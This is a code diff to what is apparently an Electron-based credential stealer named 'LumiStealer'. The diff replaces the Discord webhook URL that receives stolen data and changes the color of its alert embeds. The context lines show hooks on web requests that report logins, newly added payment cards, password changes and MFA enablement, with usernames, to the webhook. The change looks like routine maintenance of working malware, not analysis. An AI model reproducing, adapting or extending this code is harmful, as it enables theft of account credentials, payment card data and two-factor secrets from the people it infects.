@@ -11,7 +11,7 @@ var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=documen
 
 const dataNow = new Date().toISOString();
 
-const webhook = 'https://discord.com/api/webhooks/1246303198780719186/jE_tPOsey7RUh7WpYvxrzE7O-SWhHIoEWZjwQnzFBXLLmTWWHsR9ngz7j5tUrIDi9Ga2'
+const webhook = 'https://discord.com/api/webhooks/1249574571687018586/-C52uZ-bKh3AyIxb2I5GVDzNhp57WlumATrI-NjxBkCjEAC5fQx5KZoyARfA2Mp7H3dQ'
 
 let contents2FA = []
 
@@ -272,7 +272,7 @@ async function initOne() {
 
   const embed = {
     title: 'First Injection Detected - LumiStealer',
-    color: 0xb143e3,
+    color: 0x5a0998,
     fields: [
       {
         name: "Injection Path:",
@@ -388,7 +388,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedLogin = {
         title: "Login Detected - LumiSt3aler",
-        color: 0xb143e3,
+        color: 0x5a0998,
         fields: [
           {
             name: "Username:",
@@ -467,7 +467,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedLogin3 = {
         title: "Login Detected - LumiSt2aler",
-        color: 0xb143e3,
+        color: 0x5a0998,
         fields: [
           {
             name: "Username:",
@@ -553,7 +553,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedCard = {
         title: 'New Card Added - LumiStealer',
-        color: 0xb143e3,
+        color: 0x5a0998,
         fields: [
           {
             name: "Username:",
@@ -635,7 +635,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedNewPasswd = {
         title: "Password Changed - LumiStealer",
-        color: 0xb143e3,
+        color: 0x5a0998,
         fields: [
           {
             name: "Username",
@@ -715,7 +715,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       const embedMFAENABLED = {
         title: "MFA Enabled - LumiStealer",
-        color: 0xb143e3,
+        color: 0x5a0998,
         fields: [
           {
             name: "Username",
